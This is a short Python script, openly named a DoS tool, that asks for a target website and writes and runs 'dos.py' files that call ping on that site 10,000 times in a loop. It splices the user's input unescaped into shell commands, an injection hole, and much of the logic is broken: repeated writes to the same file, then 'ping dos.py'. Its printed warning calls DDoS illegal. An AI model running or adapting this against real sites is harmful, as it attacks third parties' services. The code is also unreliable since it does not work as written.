import os 
import time

linebreak = "\n"

site = input("Site to dos: ")
link = site

y1 = "dos.py"
y2 = "dos.py"
y3 = "dos.py"
y4 = "dos.py"
y5 = "dos.py"
y6 = "dos.py"
y7 = "dos.py"
y8 = "dos.py"

print('.')
time.sleep(1)
print('.')
time.sleep(1)
print('.')
time.sleep(1)
print('Warning! DDosing sites is illegal and can get you arrested.')
time.sleep(1)
print(".")
time.sleep(1.2)
print(".")
time.sleep(1.2)
print(".")
time.sleep(1.2)
print(".")
time.sleep(1.2)
start = input("Run Program?(y/n): ")

filename =('python ' + y1)

if start == 'y':
    f = open(y1, "w")
    f.write('import os')
    f.write(linebreak)
    f.write('for x in range(10000):')
    f.write(linebreak + "    ")
    f.write("os.system('ping " + link + "')")
    f.close()
    os.system(filename)
    n = open(y2, "w")
    n.write('import os')
    n.write(linebreak)
    n.write('for x in range(10000):')
    n.write(linebreak + "    ")
    n.write("os.system('ping " + link + "')")
    n.close()
    os.system('ping '+ y2)
    f = open(y3, "w")
    f.write('import os')
    f.write(linebreak)
    f.write('for x in range(10000):')
    f.write(linebreak + "    ")
    f.write("os.system('ping " + link + "')")
    f.close()
    os.system('ping '+ y3)
    f = open(y4, "w")
    f.write('import os')
    f.write(linebreak)
    f.write('for x in range(10000):')
    f.write(linebreak + "    ")
    f.write("os.system('ping " + link + "')")
    f.close()
    os.system('ping '+ y4)
    f = open(y5, "w")
    f.write('import os')
    f.write(linebreak)
    f.write('for x in range(10000):')
    f.write(linebreak + "    ")
    f.write("os.system('ping " + link + "')")
    f.close()
    os.system('ping '+ y5)


else:
    print('ddos canceled')